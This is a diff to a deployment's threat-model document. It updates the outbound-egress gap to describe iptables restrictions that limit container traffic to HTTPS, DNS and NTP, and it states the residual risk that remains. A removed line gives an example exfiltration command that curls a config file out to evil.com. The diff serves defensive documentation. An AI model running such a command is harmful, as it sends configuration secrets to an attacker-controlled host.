@@ -42,13 +42,15 @@ This document describes what the Phase 1 deployment protects against, what it do
 
 ## Known Gaps
 
-### Gap 1 — Outbound Egress Unrestricted (Phase 1)
+### Gap 1 — Outbound Egress (Resolved in Phase 1.5)
 
-Docker allows all outbound traffic by default. A compromised OpenClaw container can exfiltrate data to arbitrary hosts — for example: `curl evil.com/exfil?data=$(cat /data/config)`. Phase 1 ships with outbound unrestricted and documents this explicitly. A commented UFW outbound block is included in `scripts/provision.sh` for Phase 1.5 enablement. Uncommenting it restricts outbound to known API endpoints (Telegram, WhatsApp/Meta, Anthropic, OpenAI, NTP, DNS).
+Container outbound is restricted to HTTPS (443), DNS (53), and NTP (123) via the `OPENCLAW_EGRESS` iptables chain, hooked into Docker's `DOCKER-USER` forwarding chain. Cleartext HTTP, raw TCP to arbitrary hosts, and custom ports are blocked.
 
-**Risk:** High if container is compromised. Low if container is not compromised (which is the expected operating condition).
+A compromised container can still reach HTTPS endpoints. It cannot exfiltrate data over cleartext HTTP or arbitrary protocols. The blast radius of a compromise is reduced to services reachable via HTTPS.
 
-**Mitigation in Phase 1.5:** Enable the commented egress allowlist in `provision.sh`.
+**Setup:** `make setup-egress` (run once after deploy, or automatically on fresh deploys via `provision.sh`). See `docs/runbook.md` Section 13.
+
+**Residual risk:** A compromised container can exfiltrate data to any HTTPS endpoint. IP-level allowlisting (pinning to Anthropic/Telegram/etc. CIDR ranges) would close this further but requires ongoing maintenance as CDN IPs change and is not implemented.
 
 ### Gap 2 — /data Is the Attack Persistence Surface
 
